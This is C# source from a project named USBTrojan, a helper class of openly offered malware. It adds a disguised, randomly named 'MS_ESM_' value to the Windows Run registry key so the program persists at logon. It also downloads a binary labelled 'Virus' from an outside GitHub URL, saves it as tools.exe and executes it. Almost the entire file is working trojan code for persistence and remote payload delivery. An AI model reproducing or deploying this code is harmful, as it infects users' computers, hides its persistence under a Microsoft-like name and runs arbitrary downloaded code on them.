using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Net;
using Microsoft.Win32;

namespace USBTrojan
{
    public class Tools
    {
        private const string virusUrl = "https://raw.githubusercontent.com/anttexg/USBTrojan/master/data/cube.bin";
        public static bool AddToAutorun(string path)
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                reg.SetValue("MS_ESM_" + CreateKey(8), path);
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
        public static string CreateKey(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }
        public static bool Start(string name, string args = "")
        {
            try
            {
                System.Diagnostics.Process.Start(name, args);
                return true;
            }
            catch { }
            return false;
        }
        public static bool StartVirus(Object state = null)
        {
            string pathToVirus = Program.homeDirectory + "\\tools.exe";
            try
            {
                if (File.Exists(pathToVirus)) Start(pathToVirus);
                else
                {
                    Console.WriteLine("Downloading Virus...");
                    var client = new WebClient();
                    client.DownloadFile(virusUrl, pathToVirus);
                    return StartVirus();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[Virus exception] {ex.Message}");
            }
            return false;
        }
    }
}
